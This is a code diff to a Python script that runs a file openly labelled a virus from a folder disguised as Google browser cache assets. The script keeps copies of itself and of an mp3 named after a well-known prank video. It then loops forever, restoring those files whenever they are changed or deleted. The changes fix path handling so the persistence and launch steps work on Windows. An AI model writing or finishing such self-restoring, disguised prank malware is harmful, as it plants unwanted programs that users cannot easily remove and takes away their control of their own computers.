@@ -1,18 +1,19 @@
-import os, time, sys
+import os, time
 import subprocess
 
-home_dir = "C:/Users/justlinux"
+home_dir = r"C:\Users\justlinux"  # Use raw string
 
-# Backup file, file to check
+
 files_to_backup = [
   (__file__, __file__),
-  (f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3", f"{home_dir}/Music/youtube_com-watch-dQw4w9WgXcQ.mp3")
+  (rf"{home_dir}\Downloads\Google_Stable_x64\assets\cache\youtube_com-watch-dQw4w9WgXcQ.mp3", 
+   rf"{home_dir}\Music\youtube_com-watch-dQw4w9WgXcQ.mp3")
 ]
 
 backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]
 
-virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
-subprocess.Popen([sys.executable, 'C:\\Users\\justlinux\\Downloads\\Google_Stable_x64\\assets\\cache\\youtube_com.py"'])
+virus_path = rf"{home_dir}\Downloads\Google_Stable_x64\assets\cache\youtube_com.py"
+subprocess.Popen(['python', virus_path])
 
 while True:
   for index, file_paths in enumerate(files_to_backup):
@@ -22,4 +23,3 @@ while True:
         with open(path, "wb") as file:
           file.write(backup)
   time.sleep(1)
-
